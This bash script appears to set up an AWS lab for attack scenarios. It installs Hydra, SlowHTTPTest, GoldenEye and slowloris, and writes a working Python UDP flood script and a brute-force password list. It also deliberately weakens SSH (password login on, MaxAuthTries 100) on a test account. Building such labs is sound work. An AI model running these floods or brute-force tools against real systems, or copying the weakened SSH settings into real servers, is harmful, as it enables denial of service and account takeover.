#!/bin/bash
# === Install Attack Tools + Target Services ===
# Digunakan untuk Skenario 1, 2, dan 3
# Upload ke S3, download di EC2, jalankan: chmod +x install-attacker.sh && sudo ./install-attacker.sh

set -e
echo "=== INSTALLING ATTACK TOOLS + TARGET SERVICES ==="

# 1. System packages
echo "[1/8] System packages..."
yum update -y
yum install -y gcc make openssl-devel libssh-devel gcc-c++ python3 python3-pip git nmap httpd-tools tcpdump nginx vsftpd

# 2. Virtual environment
echo "[2/8] Python venv..."
python3 -m venv /opt/venv
/opt/venv/bin/pip install --upgrade pip
/opt/venv/bin/pip install slowloris requests

# 3. Hydra
echo "[3/8] Hydra..."
cd /tmp
curl -sL -o hydra.tar.gz https://github.com/vanhauser-thc/thc-hydra/archive/refs/tags/v9.5.tar.gz
tar xzf hydra.tar.gz && cd thc-hydra-9.5
./configure && make && make install

# 4. SlowHTTPTest
echo "[4/8] SlowHTTPTest..."
cd /tmp
curl -sL -o slowhttp.tar.gz https://github.com/shekyan/slowhttptest/archive/refs/tags/v1.9.0.tar.gz
tar xzf slowhttp.tar.gz && cd slowhttptest-1.9.0
./configure && make && make install

# 5. GoldenEye
echo "[5/8] GoldenEye..."
git clone https://github.com/jseidl/GoldenEye.git /opt/GoldenEye 2>/dev/null || true

# 6. UDP flood + password list
echo "[6/8] Scripts + wordlist..."
mkdir -p /opt/attack
cat > /opt/attack/udp_flood.py << 'EOF'
#!/usr/bin/env python3
import socket, sys, time, random
target = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end_time = time.time() + duration
count = 0
while time.time() < end_time:
    sock.sendto(random._urandom(1024), (target, port))
    count += 1
print(f"Sent {count} UDP packets in {duration}s")
EOF
chmod +x /opt/attack/udp_flood.py
echo -e "admin\nroot\npassword\n123456\ntest\ntestuser\nletmein\nqwerty\nabc123" > /opt/attack/passwords.txt

# 7. Target services
echo "[7/8] Target services..."
useradd -m testuser 2>/dev/null || true
echo "testuser:S3cur3P@ss!" | chpasswd
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#MaxAuthTries.*/MaxAuthTries 100/' /etc/ssh/sshd_config
systemctl restart sshd
systemctl enable nginx && systemctl start nginx
systemctl enable vsftpd && systemctl start vsftpd

# 8. Verify
echo "[8/8] Verifying..."
echo "=== VERIFY ==="
which hydra && echo "✓ Hydra"
which nmap && echo "✓ Nmap"
which slowhttptest && echo "✓ SlowHTTPTest"
which ab && echo "✓ ApacheBench"
which tcpdump && echo "✓ tcpdump"
/opt/venv/bin/slowloris --help 2>&1 | head -1 && echo "✓ Slowloris"
ls /opt/GoldenEye/goldeneye.py && echo "✓ GoldenEye"
systemctl is-active sshd && echo "✓ SSH"
systemctl is-active nginx && echo "✓ Nginx"
systemctl is-active vsftpd && echo "✓ FTP"
echo "=== ALL DONE ==="
